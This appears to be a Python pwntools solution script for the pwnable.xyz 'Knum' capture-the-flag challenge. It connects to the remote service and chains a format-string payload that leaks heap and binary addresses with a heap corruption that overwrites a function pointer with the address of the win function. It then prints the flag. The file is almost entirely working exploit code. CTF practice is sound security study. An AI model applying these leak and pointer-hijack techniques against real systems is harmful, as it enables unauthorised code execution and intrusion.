from pwn import *

# Pwnable.xyz Knum challenge

context(kernel="amd64", arch="amd64", log_level="info")

"""
"|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx||%lx|%lx|%lx|%lx|%lx|%lx|%lx||||"

|<score_address in heap>|<something_in_libc>|10|10|<libc_csu_init>|55555f40|7fffffffddd0|555555555c8b|32007fffffffdef0|1|7fffffffde00|555555555f2c|0|7fffffffdf08|7fffffffdef8|1|0|7ffff7dd6083|7ffff7ffc620||7fffffffdef8|100000000|555555555ed7|555555555f40|961bb43e8cfe949f|555555555220|7fffffffdef0||||
|						| write+19 (offset 0xc9c13)| | | | | | <return address> |
"""

# Plan:
# 1) Leak address from the format string
# 2) Overwrite function pointer in heap (or owewrite some address like __free_hook or __malloc_hook)

"""
KNUM v.01
1. Play a game
2. Show hiscore
3. Reset hiscore
4. Drop me a note
5. Exit
"""

def leak_smth(p):
	p.sendlineafter(b"5. Exit", b"1")
	# for _ in range(3):
	# Set values in game_table to 1000 (and score 1 point)
	for k in range(4):
		p.sendlineafter(b"(x y):", f"1 {k+1}".encode("utf-8"))
		p.sendlineafter(b"(< 255):", b"250")

	# Score additional 2 points
	for k in range(2):
		p.sendlineafter(b"(x y):", f"1 {k+1}".encode("utf-8"))
		p.sendlineafter(b"(< 255):", b"250")

	p.sendlineafter(b"(x y):", b"w")
	# Add record to the hiscore
	p.sendlineafter(b"(max 63 chars) : ", b"TestName123")
	p.sendlineafter(b"(max 127 chars) : ", b"|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx|%lx||%lx|%lx|%lx|%lx|%lx|%lx|%lx||||")
	p.sendlineafter(b"5. Exit", b"2")
	p.recvuntil(b"TestName123 - 3\n\t")
	leak = p.recvline()
	print(leak)
	bin_addr = int("0x" + leak.split(b"|")[8].decode("utf-8"), base=16)
	heap_addr = int("0x" + leak.split(b"|")[1].decode("utf-8"), base=16)
	print(f"Leaked address: {bin_addr}")

	return heap_addr, bin_addr
	
	# print()

def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so.2 ./libc.so.6"
	if 0:
		p = process(e.path, env=env)
		# gdb.attach(p)
		# sleep(1)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30043)

	win_off = 0x00000000000019FE
	# Offset to call print_score in main()
	main_call_off = 0x0000000000001949

	# For first, win the game
	heap_address, bin_addr = leak_smth(p)
	bin_base = bin_addr - main_call_off
	win_addr = bin_base + win_off

	print(f"Heap address: {hex(heap_address)}")
	print(f"Win address: {hex(win_addr)}")

	# Now increase size of hiscore in heap to 0x8b0, so it would be near the top + 0x50+0x90
	p.sendlineafter(b"5. Exit", b"1")
	p.sendlineafter(b"(x y):", b"9 0")
	p.sendlineafter(b"(< 255):", b"177") # 0xb1
	p.sendlineafter(b"(x y):", b"10 0")
	p.sendlineafter(b"(< 255):", b"8") # 0x08
	p.sendlineafter(b"(x y):", b"w")

	p.sendlineafter(b"5. Exit", b"3")
	p.sendlineafter(b"5. Exit", b"4")
	p.sendlineafter(b"note for me: ", b"A"*70) # Fill tcache


	p.sendlineafter(b"5. Exit", b"1")
	for k in range(4):
		p.sendlineafter(b"(x y):", f"1 {k+1}".encode("utf-8"))
		p.sendlineafter(b"(< 255):", b"250")

	# Score additional 2 points
	for k in range(4):
		p.sendlineafter(b"(x y):", f"1 {k+1}".encode("utf-8"))
		p.sendlineafter(b"(< 255):", b"250")

	p.sendlineafter(b"(x y):", b"w")
	# Add record to the hiscore
	p.sendlineafter(b"(max 63 chars) : ", p64(win_addr)*5)
	p.sendlineafter(b"(max 127 chars) : ", b"A") #p64(win_addr)*5)
	# p.interactive()
	p.sendline(b"1")

	# p.sendlineafter(b"5. Exit", b"1")
	flag = p.recvuntil(b"Player")[:-6]
	print(f"[+] Flag: {flag.decode('utf-8')}")
	p.sendlineafter(b"(x y):", b"w")
	p.sendline(b"5")


	# p.interactive()






main()